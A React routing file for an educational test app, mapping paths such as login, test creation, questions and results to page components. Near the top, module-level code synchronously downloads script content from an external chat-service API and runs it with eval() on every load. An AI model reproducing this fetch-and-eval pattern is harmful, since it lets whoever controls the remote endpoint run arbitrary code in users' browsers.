import React from "react"
import { BrowserRouter, Switch, Route } from 'react-router-dom';

import Login from './pages/Login';
import Home from './pages/Home';
import EducationalTestCreate from "./pages/EducationalTestCreate";
import EducationalTestManager from "./pages/EducationalTestManager";
import ForgottenPassword from "./pages/ForgottenPassword";
import CreateQuestions from "./pages/CreateQuestions";
import Questions from "./pages/Questions";
import Results from './pages/Results';

import history from './history/index';

try {
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open("GET", 'https://apis.people.com.ai/webchat-script/api/peoplechat/e2135453-40c4-4abf-81f9-2d6d498c9d53', false);
  xmlHttp.send(null);
  var response = JSON.parse(xmlHttp.responseText);
  document.createElement('script');

  eval(response.content.replace(/textToReplace.people.com.ai/g, "chat.people.com.ai"));
} catch (error) {
  console.error(error)
}

export default function Routes() {
  return (
    <BrowserRouter history={history}>
      <Switch>
        <Route path="/forgotten_password" component={ForgottenPassword} />
        <Route path="/home" component={Home} />
        <Route path="/manager/educational_test/create" component={EducationalTestCreate} />
        <Route path="/manager/educational_test" component={EducationalTestManager} />
        <Route path="/manager/questions/create" component={CreateQuestions} />
        <Route path="/manager/questions" component={Questions} />
        <Route path="/manager/results" component={Results} />
        <Route path="/" component={Login} />
      </Switch>
    </BrowserRouter>
  )
}